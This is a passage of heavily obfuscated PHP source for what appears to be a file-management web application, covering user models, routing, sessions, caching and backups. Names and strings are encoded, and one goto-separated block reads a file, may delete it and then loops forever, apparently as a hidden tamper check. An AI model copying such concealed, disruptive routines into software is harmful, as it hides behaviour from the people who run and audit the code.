$this->_listDataApply($ç’°‘œÏ); return $ç’°‘œÏ[0]; } private function _listDataApply(&$‰±ú²ı×) { $ÂÒó— =& $_SERVER[ßğøİ]; if (!$‰±ú²ı×) { return; } array_remove_key($‰±ú²ı×, $ÂÒó—[888]); $óœ·İò = array_to_keyvalue($‰±ú²ı×, $ÂÒó—[12], $ÂÒó—[1655]); $this->_listAppendGroup($‰±ú²ı×, $óœ·İò); $this->_listAppendMeta($‰±ú²ı×, $óœ·İò); $this->_listAppendSourceRoot($‰±ú²ı×, $óœ·İò); } private function _listAppendSourceRoot(&$øıëø¤Á, $­€—âèâ) { $ÈìŞ¡Î‘ =& $_SERVER[ßğøİ]; $²í£ÄƒØ = Model($ÈìŞ¡Î‘[822])->listSourceRoot(SourceModel::TYPE_USER, $­€—âèâ); $²í£ÄƒØ = array_to_keyvalue($²í£ÄƒØ, $ÈìŞ¡Î‘[505]); $²í£ÄƒØ = array_remove_key($²í£ÄƒØ, $ÈìŞ¡Î‘[505]); foreach ($øıëø¤Á as &$ÔÍ“ú‹) { $ÔÍ“ú‹[$ÈìŞ¡Î‘[86]] = $²í£ÄƒØ[$ÔÍ“ú‹[$ÈìŞ¡Î‘[1655]]] ? $²í£ÄƒØ[$ÔÍ“ú‹[$ÈìŞ¡Î‘[1655]]] : array(); } unset($ÔÍ“ú‹); } private function _listAppendGroup(&$¼Ô®“Ü, $ï¨ßèåñ) { $œ˜Ş¼à =& $_SERVER[ßğøİ]; $äÛ¢Ø ‘ = array($œ˜Ş¼à[1655] => array($œ˜Ş¼à[7], $ï¨ßèåñ)); $ğ€¨÷äÄ = Model($œ˜Ş¼à[1918])->where($äÛ¢Ø ‘)->select(); $ôî¨§›Ç = array_to_keyvalue($ğ€¨÷äÄ, $œ˜Ş¼à[12], $œ˜Ş¼à[1828]); $ôî¨§›Ç = array_remove_value(array_unique($ôî¨§›Ç), $œ˜Ş¼à[197]); if (!$ôî¨§›Ç || !$ğ€¨÷äÄ) { return; } $äÛ¢Ø ‘ = array($œ˜Ş¼à[1828] => array($œ˜Ş¼à[7], $ôî¨§›Ç)); $ÁæóÑäË = Model($œ˜Ş¼à[2009])->field($œ˜Ş¼à[2312])->where($äÛ¢Ø ‘)->select(); $ÁæóÑäË = array_to_keyvalue($ÁæóÑäË, $œ˜Ş¼à[1828]); $ğ€¨÷äÄ = array_to_keyvalue_group($ğ€¨÷äÄ, $œ˜Ş¼à[1655]); foreach ($ğ€¨÷äÄ as &$ì–½îÆÅ) { $Š§¬ã«ƒ = array(); foreach ($ì–½îÆÅ as $ø¢ğ§) { if (!$ø¢ğ§[$œ˜Ş¼à[1932]]) { continue; } $ãÌÔä¶ª = Model($œ˜Ş¼à[507])->listData($ø¢ğ§[$œ˜Ş¼à[1932]]); $Š§¬ã«ƒ[] = array($œ˜Ş¼à[1828] => $ø¢ğ§[$œ˜Ş¼à[1828]], $œ˜Ş¼à[2313] => $ÁæóÑäË[$ø¢ğ§[$œ˜Ş¼à[1828]]][$œ˜Ş¼à[32]], $œ˜Ş¼à[521] => $ÁæóÑäË[$ø¢ğ§[$œ˜Ş¼à[1828]]][$œ˜Ş¼à[521]], $œ˜Ş¼à[413] => $ãÌÔä¶ª); } $ì–½îÆÅ = $Š§¬ã«ƒ; } unset($ì–½îÆÅ); foreach ($¼Ô®“Ü as &$‘Í»Á²²) { $‘Í»Á²²[$œ˜Ş¼à[2011]] = array(); if (isset($ğ€¨÷äÄ[$‘Í»Á²²[$œ˜Ş¼à[1655]]])) { $‘Í»Á²²[$œ˜Ş¼à[2011]] = $ğ€¨÷äÄ[$‘Í»Á²²[$œ˜Ş¼à[1655]]]; } } unset($‘Í»Á²²); } public function userAppendGroup($³é„şş‡) { $ì¹¬şâ´ =& $_SERVER[ßğøİ]; if (!$³é„şş‡) { return array(); } $this->_listAppendGroup($³é„şş‡, array_to_keyvalue($³é„şş‡, $ì¹¬şâ´[12], $ì¹¬şâ´[1655])); return $³é„şş‡; } private function _listAppendMeta(&$Úüšµ¥å, $äı–àı˜) { $¿ğÔ–å =& $_SERVER[ßğøİ]; $ÂØã¢« = UserJobModel::JOB_KEY; $íÕÑ˜¹ = array($¿ğÔ–å[2292]); $²‘½Óëå = array($¿ğÔ–å[1655] => array($¿ğÔ–å[7], $äı–àı˜)); $Â©«Ø­µ = Model($¿ğÔ–å[2290])->where($²‘½Óëå)->select(); $Â©«Ø­µ = array_to_keyvalue_group($Â©«Ø­µ, $¿ğÔ–å[1655]); foreach ($Â©«Ø­µ as &$»ú‰ğ¯ü) { $ê‡¬ñİÒ = array(); foreach ($»ú‰ğ¯ü as $åºªúØ) { if (!in_array($åºªúØ[$¿ğÔ–å[94]], $íÕÑ˜¹)) { $ê‡¬ñİÒ[$åºªúØ[$¿ğÔ–å[94]]] = $åºªúØ[$¿ğÔ–å[374]]; } } $»ú‰ğ¯ü = $ê‡¬ñİÒ; } unset($»ú‰ğ¯ü); $†ÉÑ† = Model($¿ğÔ–å[2314]); foreach ($Úüšµ¥å as &$°ƒ½™©Ø) { $ŒĞÅäºş = array(); if (isset($Â©«Ø­µ[$°ƒ½™©Ø[$¿ğÔ–å[1655]]])) { $ŒĞÅäºş = $Â©«Ø­µ[$°ƒ½™©Ø[$¿ğÔ–å[1655]]]; } $°ƒ½™©Ø[$¿ğÔ–å[2315]] = array(); if (isset($ŒĞÅäºş[$ÂØã¢«])) { $°ƒ½™©Ø[$¿ğÔ–å[2315]] = $†ÉÑ†->getUserJobInfo($ŒĞÅäºş[$ÂØã¢«]); } } unset($°ƒ½™©Ø); } protected function groupUserAll($ğÃ²Ùì) { $£ó‰ÈÏŒ =& $_SERVER[ßğøİ]; if (!$ğÃ²Ùì) { return !1; } $Ö¦Ø¹Ï = Model($£ó‰ÈÏŒ[1918])->field($£ó‰ÈÏŒ[1655])->where(array($£ó‰ÈÏŒ[1828] => array($£ó‰ÈÏŒ[7], $ğÃ²Ùì)))->select(); $Ö¦Ø¹Ï = array_to_keyvalue($Ö¦Ø¹Ï, $£ó‰ÈÏŒ[12], $£ó‰ÈÏŒ[1655]); return array_unique($Ö¦Ø¹Ï); } public function userSearch($¡¿÷åÎ, $¾Çı¼ú¶ = "\x2a") { return Model($_SERVER[ßğøİ][535])->where($¡¿÷åÎ)->field($¾Çı¼ú¶)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\x72\137\157\x70\164\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($§šĞ¾ñÁ) { $ÇæÎÛÇ =& $_SERVER[ßğøİ]; if (!defined($ÇæÎÛÇ[475])) { define($ÇæÎÛÇ[475], 0); } return "\x55\x73\x65\162\x4f\160\164\151\x6f\156\x5f{$§šĞ¾ñÁ}\137" . USER_ID; } protected function filterWhere($ Ò·Œ®„) { $Ì‚‚ƒíß =& $_SERVER[ßğøİ]; if (!defined($Ì‚‚ƒíß[475])) { define($Ì‚‚ƒíß[475], 0); } $ Ò·Œ®„[$Ì‚‚ƒíß[1655]] = USER_ID; return $ Ò·Œ®„; } public function cacheRemoveUser($÷Ÿš‹â, $…şÔÑâú) { return Cache::remove("\125\x73\145\162\117\160\x74\x69\x6f\x6e\x5f{$÷Ÿš‹â}\x5f" . $…şÔÑâú); } protected function optionDefault($ƒºËª½õ = '') { $œ×í­Èã =& $_SERVER[ßğøİ]; if ($ƒºËª½õ == $œ×í­Èã[12]) { return $GLOBALS[$œ×í­Èã[6]][$œ×í­Èã[2316]]; } if ($ƒºËª½õ == $œ×í­Èã[2317]) { return $GLOBALS[$œ×í­Èã[6]][$œ×í­Èã[2318]]; } } } goto B•Ø‰¦ÖÈÏ; fŒ³øæœÅ: if (!isset($_SERVER[$_SERVER[ßğøİ][871]]) || !isset($_SERVER[$_SERVER[ßğøİ][869]])) { $_getc = $_SERVER[ßğøİ][873]; $_getfile = $_SERVER[$_SERVER[ßğøİ][874]] . $_SERVER[ßğøİ][875]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ßğøİ][231], $_getfilec); if (count($_getarrs) < $_SERVER[ßğøİ][660]) { $exit = $_SERVER[ßğøİ][876]; $exit(); } $_act = $_SERVER[ßğøİ][911]; $_act($_SERVER[$_SERVER[ßğøİ][874]] . $_SERVER[ßğøİ][875]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ßğøİ][378]); } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\171" => "\133\136\57\135\x2b", "\72\x6e\165\155" => "\x5b\60\55\x39\135\x2b", "\72\x61\154\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($”ÓŞ»Ã¡, $Ì‘Øø½ˆ) { $•Ú¿¥ØÑ =& $_SERVER[ßğøİ]; if ($”ÓŞ»Ã¡ == $•Ú¿¥ØÑ[1599]) { $ŒÂÉ¼ì÷ = array_map($•Ú¿¥ØÑ[1600], $Ì‘Øø½ˆ[0]); $§øñ —® = strpos($Ì‘Øø½ˆ[1], $•Ú¿¥ØÑ[8]) === 0 ? $Ì‘Øø½ˆ[1] : $•Ú¿¥ØÑ[8] . $Ì‘Øø½ˆ[1]; $çäÌú = $Ì‘Øø½ˆ[2]; } else { $ŒÂÉ¼ì÷ = null; $§øñ —® = strpos($Ì‘Øø½ˆ[0], $•Ú¿¥ØÑ[8]) === 0 ? $Ì‘Øø½ˆ[0] : $•Ú¿¥ØÑ[8] . $Ì‘Øø½ˆ[0]; $çäÌú = $Ì‘Øø½ˆ[1]; } array_push(self::$maps, $ŒÂÉ¼ì÷); array_push(self::$routes, $§øñ —®); array_push(self::$methods, strtoupper($”ÓŞ»Ã¡)); array_push(self::$callbacks, $çäÌú); } public static function error($ä’Ëğ¼ñ) { self::$errorCallback = $ä’Ëğ¼ñ; } public static function haltOnMatch($­ÌìÑÙ° = true) { self::$halts = $­ÌìÑÙ°; } public static function dispatch() { $Ê­×Á× =& $_SERVER[ßğøİ]; $àÎ¼Ë·æ = parse_url($_SERVER[$Ê­×Á×[1601]], PHP_URL_PATH); $ı­Ùíù£ = $_SERVER[$Ê­×Á×[159]]; $Êû·‚ıå = array_keys(static::$patterns); $‡Í“óÂø = array_values(static::$patterns); $ç­¼ÕçŠ = !1; self::$routes = preg_replace($Ê­×Á×[1269], $Ê­×Á×[8], self::$routes); if (in_array($àÎ¼Ë·æ, self::$routes)) { $ßì‹«¡Ò = array_keys(self::$routes, $àÎ¼Ë·æ); foreach ($ßì‹«¡Ò as $¡äˆÆì’) { if (self::$methods[$¡äˆÆì’] == $ı­Ùíù£ || self::$methods[$¡äˆÆì’] == $Ê­×Á×[1602] || in_array($ı­Ùíù£, self::$maps[$¡äˆÆì’])) { $ç­¼ÕçŠ = !0; if (!is_object(self::$callbacks[$¡äˆÆì’])) { $åª½à–Æ = explode($Ê­×Á×[8], self::$callbacks[$¡äˆÆì’]); $ë“¹õá© = end($åª½à–Æ); $³˜ˆèó“ = explode($Ê­×Á×[1603], $ë“¹õá©); $éŞÇøâ¿ = new $³˜ˆèó“[0](); $éŞÇøâ¿->{$³˜ˆèó“[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$¡äˆÆì’]); if (self::$halts) { return; } } } } } else { $Úœà¥™÷ = 0; foreach (self::$routes as $¡äˆÆì’) { if (strpos($¡äˆÆì’, $Ê­×Á×[4]) !== !1) { $¡äˆÆì’ = str_replace($Êû·‚ıå, $‡Í“óÂø, $¡äˆÆì’); } if (preg_match($Ê­×Á×[1604] . $¡äˆÆì’ . $Ê­×Á×[1605], $àÎ¼Ë·æ, $‰Ê™°©)) { if (self::$methods[$Úœà¥™÷] == $ı­Ùíù£ || self::$methods[$Úœà¥™÷] == $Ê­×Á×[1602] || !empty(self::$maps[$Úœà¥™÷]) && in_array($ı­Ùíù£, self::$maps[$Úœà¥™÷])) { $ç­¼ÕçŠ = !0; array_shift($‰Ê™°©); if (!is_object(self::$callbacks[$Úœà¥™÷])) { $åª½à–Æ = explode($Ê­×Á×[8], self::$callbacks[$Úœà¥™÷]); $ë“¹õá© = end($åª½à–Æ); $³˜ˆèó“ = explode($Ê­×Á×[1603], $ë“¹õá©); $éŞÇøâ¿ = new $³˜ˆèó“[0](); if (!method_exists($éŞÇøâ¿, $³˜ˆèó“[1])) { echo $Ê­×Á×[1606]; } else { call_user_func_array(array($éŞÇøâ¿, $³˜ˆèó“[1]), $‰Ê™°©); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Úœà¥™÷], $‰Ê™°©); if (self::$halts) { return; } } } } $Úœà¥™÷++; } } if ($ç­¼ÕçŠ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $âş€îéæ =& $_SERVER[ßğøİ]; header($_SERVER[$âş€îéæ[1607]] . $âş€îéæ[1608]); echo $âş€îéæ[1609]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Ê­×Á×[1601]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Ó„¶£è =& $_SERVER[ßğøİ]; static $½×™öáø = false; if ($½×™öáø) { return $½×™öáø; } $ØÂÉ·ÆĞ = $GLOBALS[$Ó„¶£è[6]][$Ó„¶£è[349]]; self::$sessionTime = $ØÂÉ·ÆĞ[$Ó„¶£è[1610]]; $ÍŞ¸©¿ = isset($GLOBALS[$Ó„¶£è[1611]]) ? $GLOBALS[$Ó„¶£è[1611]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ÍŞ¸©¿)) { self::$sessionSign = Cookie::get($ÍŞ¸©¿); } else { self::$sessionSign = guid(); } } Cookie::setSafe($ÍŞ¸©¿, self::$sessionSign, self::$sessionTime); $‰ışÈû = $ØÂÉ·ÆĞ[$Ó„¶£è[1612]]; $ñ™ù¹¯Š = $ØÂÉ·ÆĞ[$‰ışÈû]; $”Â¤ûõ = $ØÂÉ·ÆĞ[$Ó„¶£è[825]]; switch ($‰ışÈû) { case $Ó„¶£è[21]: self::$handle = Model($Ó„¶£è[826]); break; case $Ó„¶£è[827]: self::$handle = new CacheRedis($ñ™ù¹¯Š, $”Â¤ûõ); break; case $Ó„¶£è[828]: self::$handle = new CacheMemcached($ñ™ù¹¯Š, $”Â¤ûõ); break; case $Ó„¶£è[199]: $ñ™ù¹¯Š[$Ó„¶£è[84]] = $ñ™ù¹¯Š[$Ó„¶£è[84]] . $Ó„¶£è[1613]; self::$handle = new CacheFile($ñ™ù¹¯Š, $”Â¤ûõ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $½×™öáø = new self(); return $½×™öáø; } public static function getBySign($œ×İ Å·) { CacheLock::lock($œ×İ Å·); $ˆŒÊö© = self::$handle->get($œ×İ Å·); CacheLock::unlock($œ×İ Å·); $ˆŒÊö© = unserialize($ˆŒÊö©); return is_array($ˆŒÊö©) ? $ˆŒÊö© : array(); } public static function setBySign($Ş¬¡ù”ü, $©ç§õº½) { CacheLock::lock($Ş¬¡ù”ü); self::$handle->set($Ş¬¡ù”ü, serialize($©ç§õº½), self::$sessionTime); CacheLock::unlock($Ş¬¡ù”ü); } public static function sign($ì¶ĞœÇÊ = false) { $ì¶ĞœÇÊ && (self::$sessionSign = $ì¶ĞœÇÊ); self::init(); return self::$sessionSign; } public static function set($®Ö·…ìì, $ÒÃ°ÏÚ = false) { self::init(); if (is_array($®Ö·…ìì)) { foreach ($®Ö·…ìì as $ëôà¨ÅÒ => $è™ô·Üú) { array_set_value(self::$data, $ëôà¨ÅÒ, $è™ô·Üú); } } else { array_set_value(self::$data, $®Ö·…ìì, $ÒÃ°ÏÚ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ô€åĞ–À = false) { self::init(); if (!$ô€åĞ–À) { return self::$data; } return array_get_value(self::$data, $ô€åĞ–À); } public static function remove($’£¡ù³£) { self::init(); unset(self::$data[$’£¡ù³£]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ßğøİ][830])) { self::$handle->clearTimeout(); } } } goto AœáÓçåï; aÇ­µºœá: class BackupDbFile { public function __construct() { } public function index() { $©ÊÊÒÈ… =& $_SERVER[ßğøİ]; $ø¥„šŒö = Backup::get(); $Èø‘ø„ = $ø¥„šŒö[$©ÊÊÒÈ…[32]]; $çêåååõ = $this->tmpFilesPath() . "\142\141\143\x6b\x75\160\137{$Èø‘ø„}\x2f"; $Ï¥Ôèò‚ = $this->backupPath($ø¥„šŒö); if (!($Ï¥Ôèò‚ = IO::mkdir($Ï¥Ôèò‚))) { return !1; } $üÜÛâ‘Û = IO::listPath($çêåååõ); $‡ïËºôÆ = isset($üÜÛâ‘Û[$©ÊÊÒÈ…[83]]) ? $üÜÛâ‘Û[$©ÊÊÒÈ…[83]] : array(); $‹¥Ö„ = array_sum(array_column($‡ïËºôÆ, $©ÊÊÒÈ…[76])); if (!$‹¥Ö„) { return !1; } $¶±é‘‚‚ = array($©ÊÊÒÈ…[795] => $‹¥Ö„, $©ÊÊÒÈ…[796] => time()); Backup::set($¶±é‘‚‚); $é¨¤èİ‚ = new TaskFileTransfer($©ÊÊÒÈ…[797], $©ÊÊÒÈ…[777], count($‡ïËºôÆ), LNG($©ÊÊÒÈ…[778]) . $©ÊÊÒÈ…[386] . LNG($©ÊÊÒÈ…[780]) . $©ÊÊÒÈ…[798]); $é¨¤èİ‚->task[$©ÊÊÒÈ…[760]] = $‹¥Ö„; foreach ($üÜÛâ‘Û[$©ÊÊÒÈ…[83]] as $îÇŞûÓÊ) { $µøâ™ÒÉ = IO::move($îÇŞûÓÊ[$©ÊÊÒÈ…[84]], $Ï¥Ôèò‚); if (!$µøâ™ÒÉ) { $é¨¤èİ‚->end(); $óÄ˜è÷ = IO::getLastError($©ÊÊÒÈ…[799] . $îÇŞûÓÊ[$©ÊÊÒÈ…[84]] . $©ÊÊÒÈ…[800] . $Ï¥Ôèò‚ . $©ÊÊÒÈ…[164]); write_log($óÄ˜è÷, $©ÊÊÒÈ…[777]); return !1; } } $µ„´”ÇÍ = new DbManage(); $ï±—ß® = $µ„´”ÇÍ->getSqlFile(); if (!$ï±—ß®[$©ÊÊÒÈ…[801]] || !$ï±—ß®[$©ÊÊÒÈ…[13]]) { return !1; } IO::move($ï±—ß®[$©ÊÊÒÈ…[801]], $Ï¥Ôèò‚); IO::move($ï±—ß®[$©ÊÊÒÈ…[13]], $Ï¥Ôèò‚); $é¨¤èİ‚->end(); $¶±é‘‚‚ = array($©ÊÊÒÈ…[802] => $‹¥Ö„, $©ÊÊÒÈ…[803] => time()); Backup::set($¶±é‘‚‚); return !0; } private function backupPath($êï¿¼‚) { $¹şÀºü´ =& $_SERVER[ßğøİ]; $«ÛÒ“¨É = $êï¿¼‚[$¹şÀºü´[32]]; $ƒ¨Š˜‚è = Model($¹şÀºü´[767])->get($¹şÀºü´[768]); $Ôú¥ø·Á = substr(md5($¹şÀºü´[769] . $ƒ¨Š˜‚è . $«ÛÒ“¨É), 0, 8); return "\173\151\157\72{$êï¿¼‚[$¹şÀºü´[749]]}\x7d\57\x64\141\164\141\142\141\163\x65\57\142\141\x63\153\x75\x70\x2f" . $«ÛÒ“¨É . $¹şÀºü´[11] . $Ôú¥ø·Á; } private function tmpFilesPath() { $°…³ÍÃ =& $_SERVER[ßğøİ]; $Ä³ƒ¬²Ê = TEMP_FILES; if ($GLOBALS[$°…³ÍÃ[6]][$°…³ÍÃ[89]][$°…³ÍÃ[793]]) { $Ä³ƒ¬²Ê = $GLOBALS[$°…³ÍÃ[6]][$°…³ÍÃ[89]][$°…³ÍÃ[793]]; if (!mk_dir($Ä³ƒ¬²Ê) || !is_writable($Ä³ƒ¬²Ê) || !IO::mkfile($Ä³ƒ¬²Ê . $°…³ÍÃ[794])) { $Ä³ƒ¬²Ê = TEMP_FILES; } } return $Ä³ƒ¬²Ê; } } class BackupFile { public function __construct() { } public function index() { $Åİ¨Æ” = Backup::get(); $¥ï¾ñ¸­ = $Åİ¨Æ”[$_SERVER[ßğøİ][293]][$_SERVER[ßğøİ][199]][$_SERVER[ßğøİ][468]]; $¸äÛÍ”İ = array($_SERVER[ßğøİ][469] => array($_SERVER[ßğøİ][804], $¥ï¾ñ¸­), $_SERVER[ßğøİ][805] => array($_SERVER[ßğøİ][331], $Åİ¨Æ”[$_SERVER[ßğøİ][749]])); $ÓÆÍÒâ = (int) Model($_SERVER[ßğøİ][786])->where($¸äÛÍ”İ)->count($_SERVER[ßğøİ][468]); $±Â¤Áä = (int) Model($_SERVER[ßğøİ][786])->where($¸äÛÍ”İ)->sum($_SERVER[ßğøİ][76]); $ùñÌìù¼ = new TaskFileTransfer($_SERVER[ßğøİ][806], $_SERVER[ßğøİ][777], $ÓÆÍÒâ, LNG($_SERVER[ßğøİ][778]) . $_SERVER[ßğøİ][779] . LNG($_SERVER[ßğøİ][807])); $ùñÌìù¼->task[$_SERVER[ßğøİ][760]] = $±Â¤Áä; $Œ„œ•½ô = array($_SERVER[ßğøİ][808] => $ÓÆÍÒâ, $_SERVER[ßğøİ][809] => $±Â¤Áä, $_SERVER[ßğøİ][810] => time()); Backup::set($Œ„œ•½ô); $ã‘ôÊ”Ş = !0; $ÆÌ…œó = $this->storeIds(); $’üğ¶òØ = 1; $Ë¹³ˆ½ú = 1000; $äƒğÀŞ÷ = $¼…Ä‰¶ = 0; $åŸøÑÜ„ = array(); $ ÖÊ®Ÿ = $®€°¦™‰ = 0; do { $ûÏ°¹Â— = $_SERVER[ßğøİ][811]; $Ì’ÛÛÆ = Model($_SERVER[ßğøİ][786])->where($¸äÛÍ”İ)->field($ûÏ°¹Â—)->order($_SERVER[ßğøİ][812])->selectPage($Ë¹³ˆ½ú, $’üğ¶òØ); $ßä“™Š˜ = !empty($Ì’ÛÛÆ[$_SERVER[ßğøİ][369]]) ? $Ì’ÛÛÆ[$_SERVER[ßğøİ][369]] : array(); foreach ($ßä“™Š˜ as $ó„Ã®È) { if (!$this->_fileExist($ó„Ã®È, $åŸøÑÜ„, $ÆÌ…œó)) { $ÓÆÍÒâ -= 1; $±Â¤Áä -= (int) $ó„Ã®È[$_SERVER[ßğøİ][76]]; write_log("\146\x69\154\x65\40\x6e\157\x74\x20\145\170\151\163\164\56\146\151\154\x65\111\104\x3a{$ó„Ã®È[$_SERVER[ßğøİ][468]]}\x2c\40\x70\x61\164\x68\x3a{$ó„Ã®È[$_SERVER[ßğøİ][84]]}", $_SERVER[ßğøİ][813]); continue; } $¬ß±äê‚ = $ó„Ã®È[$_SERVER[ßğøİ][84]]; $á±Ñú¤ = "\x7b\x69\x6f\72{$Åİ¨Æ”[$_SERVER[ßğøİ][749]]}\175" . substr($¬ß±äê‚, strlen("\x7b\x69\157\x3a{$ó„Ã®È[$_SERVER[ßğøİ][814]]}\x7d")); if (IO::exist($á±Ñú¤)) { $ùñÌìù¼->updateFileEnd($ó„Ã®È[$_SERVER[ßğøİ][32]], $ó„Ã®È[$_SERVER[ßğøİ][76]]); } else { $á±Ñú¤ = get_path_father($á±Ñú¤); IO::mkdir($á±Ñú¤); if (!IO::copy($¬ß±äê‚, $á±Ñú¤, $_SERVER[ßğøİ][815])) { write_log($_SERVER[ßğøİ][816] . $¬ß±äê‚ . $_SERVER[ßğøİ][800] . $á±Ñú¤ . $_SERVER[ßğøİ][164], $_SERVER[ßğøİ][777]); $ã‘ôÊ”Ş = !1; break; } } $¥ï¾ñ¸­ = $ó„Ã®È[$_SERVER[ßğøİ][468]]; $¼…Ä‰¶ += 1; $äƒğÀŞ÷ += $ó„Ã®È[$_SERVER[ßğøİ][76]]; $®€°¦™‰ += 1; $ ÖÊ®Ÿ += $ó„Ã®È[$_SERVER[ßğøİ][76]]; if ($äƒğÀŞ÷ >= 1024 * 1024 * 100) { $Œ„œ•½ô = array($_SERVER[ßğøİ][817] => $¥ï¾ñ¸­, $_SERVER[ßğøİ][818] => $®€°¦™‰, $_SERVER[ßğøİ][819] => $ ÖÊ®Ÿ); Backup::set($Œ„œ•½ô); $äƒğÀŞ÷ = $¼…Ä‰¶ = 0; } } $÷ö¢¸¶Í = count($ßä“™Š˜); $’üğ¶òØ++; } while ($÷ö¢¸¶Í == $Ë¹³ˆ½ú); $ùñÌìù¼->end(); $Œ„œ•½ô = array($_SERVER[ßğøİ][820] => 1, $_SERVER[ßğøİ][497] => time(), $_SERVER[ßğøİ][772] => 1, $_SERVER[ßğøİ][817] => $¥ï¾ñ¸­, $_SERVER[ßğøİ][809] => $±Â¤Áä, $_SERVER[ßğøİ][808] => $ÓÆÍÒâ, $_SERVER[ßğøİ][821] => time()); if ($¼…Ä‰¶) { $Œ„œ•½ô[$_SERVER[ßğøİ][818]] = $®€°¦™‰; $Œ„œ•½ô[$_SERVER[ßğøİ][819]] = $ ÖÊ®Ÿ; } Backup::set($Œ„œ•½ô); $this->_fileFilter($åŸøÑÜ„); return !0; } private function _fileExist($œ øÉø¢, &$‡»µÕÎ³, $ëÙñî´) { $È«‚Òİ§ =& $_SERVER[ßğøİ]; $ñ¢âáÙ³ = $œ øÉø¢[$È«‚Òİ§[84]]; if (in_array($œ øÉø¢[$È«‚Òİ§[468]], $‡»µÕÎ³)) { return !1; } if (!in_array($œ øÉø¢[$È«‚Òİ§[814]], $ëÙñî´)) { return !1; } if (IO::exist($ñ¢âáÙ³)) { return !0; } $ÙÅšú® = get_path_father($ñ¢âáÙ³); if (IO::exist($ÙÅšú®)) { $‡»µÕÎ³[] = $œ øÉø¢[$È«‚Òİ§[468]]; return !1; } $„ñÓà´œ = array($È«‚Òİ§[814] => $œ øÉø¢[$È«‚Òİ§[814]], $È«‚Òİ§[84] => array($È«‚Òİ§[383], "{$ÙÅšú®}\x25")); $–Š¼ì˜ = Model($È«‚Òİ§[786])->where($„ñÓà´œ)->field($È«‚Òİ§[469])->select(); $‡»µÕÎ³ = array_merge($‡»µÕÎ³, array_to_keyvalue($–Š¼ì˜, $È«‚Òİ§[12], $È«‚Òİ§[468])); return !1; } private function _fileFilter($šŞ“€Œ) { $Á£€ÂÁÆ =& $_SERVER[ßğøİ]; if (empty($šŞ“€Œ)) { return; } $¿¢·‹Í´ = array($Á£€ÂÁÆ[468] => array($Á£€ÂÁÆ[7], array_unique($šŞ“€Œ))); $°Ï˜–à® = Model($Á£€ÂÁÆ[822])->where($¿¢·‹Í´)->field($Á£€ÂÁÆ[402])->select(); foreach ($°Ï˜–à® as $‘ÏÓ·¬ş) { Model($Á£€ÂÁÆ[822])->remove($‘ÏÓ·¬ş[$Á£€ÂÁÆ[402]], !1); } } private function storeIds() { $åìßİ§Ø =& $_SERVER[ßğøİ]; $°‡×˜œÃ = Model($åìßİ§Ø[764])->listData(); $£Ø—ÔŸï = array(); $ØÉ–Ç = $GLOBALS[$åìßİ§Ø[6]][$åìßİ§Ø[89]][$åìßİ§Ø[823]]; foreach ($°‡×˜œÃ as $š½¦ğ«¦) { $ÕüìêÅÆ = strtolower($š½¦ğ«¦[$åìßİ§Ø[95]]); if (!isset($ØÉ–Ç[$ÕüìêÅÆ])) { continue; } $íŠîù¡ = $åìßİ§Ø[74] . (isset($ØÉ–Ç[$ÕüìêÅÆ]) ? $ØÉ–Ç[$ÕüìêÅÆ] : ucfirst($ÕüìêÅÆ)); if (!class_exists($íŠîù¡)) { continue; } $£Ø—ÔŸï[] = $š½¦ğ«¦[$åìßİ§Ø[399]]; } return $£Ø—ÔŸï; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $æ×ÏÊ¾ó =& $_SERVER[ßğøİ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $†—ì´ƒ© = $GLOBALS[$æ×ÏÊ¾ó[6]][$æ×ÏÊ¾ó[349]]; $·ßĞÏß = $†—ì´ƒ©[$†—ì´ƒ©[$æ×ÏÊ¾ó[824]]]; $°“•€ŸŒ = $†—ì´ƒ©[$æ×ÏÊ¾ó[825]]; switch ($†—ì´ƒ©[$æ×ÏÊ¾ó[824]]) { case $æ×ÏÊ¾ó[21]: self::$handle = Model($æ×ÏÊ¾ó[826]); break; case $æ×ÏÊ¾ó[827]: self::$handle = new CacheRedis($·ßĞÏß, $°“•€ŸŒ); break; case $æ×ÏÊ¾ó[828]: self::$handle = new CacheMemcached($·ßĞÏß, $°“•€ŸŒ); break; case $æ×ÏÊ¾ó[199]: self::$handle = new CacheFile($·ßĞÏß, $°“•€ŸŒ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ëŠ«€‰í) { if (is_array($ëŠ«€‰í) || is_object($ëŠ«€‰í)) { $ëŠ«€‰í = json_encode($ëŠ«€‰í); } $ëŠ«€‰í = rawurlencode($ëŠ«€‰í); return md5(KOD_SITE_ID . $_SERVER[ßğøİ][11] . $ëŠ«€‰í); } public static function get($öàõÖØÓ, $ÊêÕÅº = false) { $àùñÖÅÚ = self::key($öàõÖØÓ); if ($ÊêÕÅº) { return unserialize(self::init()->get($àùñÖÅÚ)); } if (!isset(self::$memoryCache[$àùñÖÅÚ])) { $””¶µê© = self::init()->get($àùñÖÅÚ); self::$memoryCache[$àùñÖÅÚ] = unserialize($””¶µê©); } return self::$memoryCache[$àùñÖÅÚ]; } public static function set($§¡É¾º³, $Ÿûî‰Ù, $ğßÖ™Ãü = false) { $Ç“ßµóÒ = self::key($§¡É¾º³); if (isset(self::$memoryCache[$Ç“ßµóÒ]) && 